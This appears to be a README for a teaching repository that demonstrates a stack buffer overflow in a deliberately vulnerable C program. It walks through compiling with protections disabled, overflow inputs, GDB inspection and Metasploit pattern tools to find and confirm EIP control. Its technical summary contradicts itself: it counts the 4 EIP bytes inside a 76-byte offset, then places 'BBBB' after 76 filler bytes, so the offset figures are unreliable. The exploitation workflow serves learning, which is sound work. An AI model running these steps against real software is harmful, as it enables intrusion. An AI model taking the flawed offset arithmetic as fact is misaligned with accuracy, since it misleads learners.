# Binary Exploitation: Stack Overflow Demo

This repository demonstrates a classic stack-based buffer overflow in a deliberately vulnerable C program. It includes the vulnerable source code, compilation steps, binary analysis commands, debugging workflow, and exploitation methodology.

---

## 🔥 Overview
The project showcases how an unbounded `strcpy()` call can overwrite stack memory, allowing control of EIP and redirection of program execution. It is intended for **learning purposes only**.

---

## 📁 Repository Structure
```
├── vulnerable.c          # Source code with stack overflow vulnerability
├── vulnerable            # Compiled binary (optional)
└── README.md             # Documentation
```

---

## 🛠️ Compilation (Disable Protections)
Compile the program with stack protections disabled to demonstrate exploitation:
```bash
gcc -fno-stack-protector -z execstack -no-pie -g -o vulnerable vulnerable.c
```

---

## 🔍 Binary Analysis Commands
Search for useful values such as passwords, flags, or strings:
```bash
strings vulnerable | grep -i -E 'password|admin|key|flag'
```

Test basic overflow behavior:
```bash
./vulnerable $(python3 -c "print('A' * 100)")
```

---

## 🐞 GDB Debugging Commands
Start debugging:
```bash
gdb ./vulnerable
```
Run with overflow input:
```gdb
run $(python3 -c "print('A' * 100)")
info registers eip
x/20wx $esp
```

---

## 💥 Exploitation Workflow
### 1. Identify Offset to EIP
```bash
msf-pattern_create -l 100
msf-pattern_offset -q EIP_VALUE
```

### 2. Confirm EIP Control
```bash
./vulnerable $(python3 -c "print('A'*76 + 'BBBB')")
```

---

## 📘 Technical Summary (50 Words)
1. The program uses unbounded `strcpy()`, allowing writes past a 64‑byte buffer.
2. EIP control occurs at **76 bytes** (64 buffer + 8 EBP + 4 EIP).
3. With no stack protections (no canaries, executable stack, no PIE), exploitation is reliable and demonstrates a classic stack overflow vulnerability.

---

## ⚠️ Disclaimer
This repository is for **educational and research purposes only**. Do not use these techniques on systems you do not own or have permission to test.

---

## ⭐ Contributions
Pull requests to extend the documentation or add mitigation examples are welcome!

---

## 📬 Contact
If you have questions or want additional writeups, feel free to open an issue.

